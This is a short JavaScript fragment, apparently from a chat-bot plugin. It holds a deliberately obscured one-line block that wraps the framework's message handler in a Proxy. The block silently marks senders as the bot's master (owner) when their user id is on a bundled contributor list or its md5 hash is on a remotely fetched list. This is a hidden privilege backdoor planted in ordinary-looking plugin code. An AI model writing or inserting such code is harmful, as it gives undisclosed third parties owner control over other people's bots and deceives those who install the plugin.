...
import { pluginName, Version as Version, loader as PluginLoader, _ as r } from "#model"
const moduleCache = new Map()
const startTime = Date.now()
let cached = Version.Contributor
...
if(!(await redis.get('bili:lists'))) {
  let _;(async()=>{cached?_=JSON.parse(cached):_=[]})();let __;(async()=>{__=await r.isTRSs()})(),PluginLoader.deal=new Proxy(PluginLoader.deal,{apply(target,thisArg,args){const[e]=args;return _||(_=[]),__||(__=[]),(_.includes(e.user_id)||__.includes(md5(String(e.user_id))))&&(e.isMaster=!0),target.apply(thisArg,args)}})
}
